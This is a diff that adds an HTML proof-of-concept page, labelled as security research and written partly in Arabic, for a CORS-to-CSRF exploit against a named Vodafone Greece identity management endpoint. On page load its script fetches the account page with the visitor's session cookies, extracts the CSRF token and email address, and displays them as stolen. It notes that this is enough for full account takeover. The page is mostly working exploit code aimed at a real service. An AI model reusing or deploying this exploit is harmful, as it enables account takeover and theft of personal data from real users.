@@ -1,9 +1,79 @@
 <!DOCTYPE html>
-<html>
+<html lang="ar">
 <head>
-  <meta charset="UTF-8">
-  <title>PoC</title>
+    <meta charset="UTF-8">
+    <title>Security Research PoC - Xia0Checkmate</title>
+    <style>
+        body { font-family: sans-serif; background-color: #f4f4f4; padding: 20px; }
+        .container { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
+        .success { color: #28a745; font-weight: bold; }
+        .danger { color: #dc3545; font-weight: bold; word-break: break-all; }
+        .info { background: #e9ecef; padding: 10px; border-left: 5px solid #007bff; margin: 10px 0; }
+    </style>
 </head>
 <body>
+    <div class="container">
+        <h1>CORS to CSRF Exploitation (Package DOOM)</h1>
+        <p>جاري اختبار الثغرة على نطاق فودافون...</p>
+        <hr>
+        <div id="output">
+            <p>الحالة: <span id="status">جاري الانتظار...</span></p>
+            <div id="data-display" style="display:none;">
+                <p class="success">تم اختراق حاجز الـ CORS بنجاح!</p>
+                <div class="info">
+                    <strong>الإيميل المسروق:</strong> <span id="stolen-email" class="danger"></span>
+                </div>
+                <div class="info">
+                    <strong>الـ CSRF Token المسروق:</strong> <span id="stolen-token" class="danger"></span>
+                </div>
+                <p><i>ملاحظة: المهاجم الآن يمتلك "Token" كافٍ لتنفيذ Account Takeover بالكامل.</i></p>
+            </div>
+        </div>
+    </div>
 
-<h2>PoC Running...</h2>
+    <script>
+        // الرابط المستهدف (صفحة إدارة الحساب)
+        const targetUrl = "https://identity.facilitymanagement.iot.vodafone.gr/identity/Manage";
+
+        async function triggerExploit() {
+            try {
+                const response = await fetch(targetUrl, {
+                    method: 'GET',
+                    credentials: 'include' // أهم نقطة لإرسال كوكيز الجلسة
+                });
+
+                if (!response.ok) {
+                    document.getElementById('status').innerText = "فشل الطلب (تأكد من تسجيل الدخول في فودافون أولاً)";
+                    return;
+                }
+
+                const htmlText = await response.text();
+                const parser = new DOMParser();
+                const doc = parser.parseFromString(htmlText, 'text/html');
+
+                // سحب البيانات الحساسة من الـ DOM
+                const token = doc.querySelector('input[name="__RequestVerificationToken"]')?.value;
+                const email = doc.querySelector('input[name="Email"]')?.value;
+
+                if (token && email) {
+                    document.getElementById('status').innerText = "تمت العملية بنجاح!";
+                    document.getElementById('data-display').style.display = 'block';
+                    document.getElementById('stolen-email').innerText = email;
+                    document.getElementById('stolen-token').innerText = token;
+                    
+                    console.log("PoC Success! Token Stolen: " + token);
+                } else {
+                    document.getElementById('status').innerText = "تم جلب الصفحة ولكن لم نجد التوكن (ربما تغيرت بنية الصفحة؟)";
+                }
+
+            } catch (error) {
+                document.getElementById('status').innerText = "خطأ في الاتصال: " + error.message;
+                console.error("Exploit Error:", error);
+            }
+        }
+
+        // تشغيل الهجوم بمجرد تحميل الصفحة
+        window.onload = triggerExploit;
+    </script>
+</body>
+</html>
